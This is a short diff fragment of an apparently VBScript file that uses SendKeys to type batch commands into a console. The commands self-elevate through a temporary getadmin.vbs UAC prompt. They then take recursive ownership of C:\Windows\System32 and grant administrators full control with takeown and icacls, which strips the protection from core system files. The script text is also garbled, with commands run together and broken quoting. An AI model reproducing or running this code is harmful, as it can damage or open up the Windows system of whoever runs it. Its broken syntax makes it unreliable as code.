@@ -17,7 +17,6 @@ WshShell.SendKeys " net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else
 WshShell.SendKeys "echo UAC.ShellExecute %~s0, "", "", runas, 1 >> %temp%\getadmin.vbstemp%\getadmin.vbs del %temp%\getadmin.vbs exit /b"
 
 WshShell.SendKeys " if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0 ( >nul 2>&1 %SYSTEMROOT%\system32\cacls.exe %SYSTEMROOT%\system32\config\system || ( echo Set UAC = CreateObject^(Shell.Application^) > %temp%\getadmin.vbs"
-
 "takeown /f C:\Windows\System32 /r /d y icacls C:\Windows\System32 /grant administrators:F /t "
 
 WshShell.SendKeys "{ENTER}" 
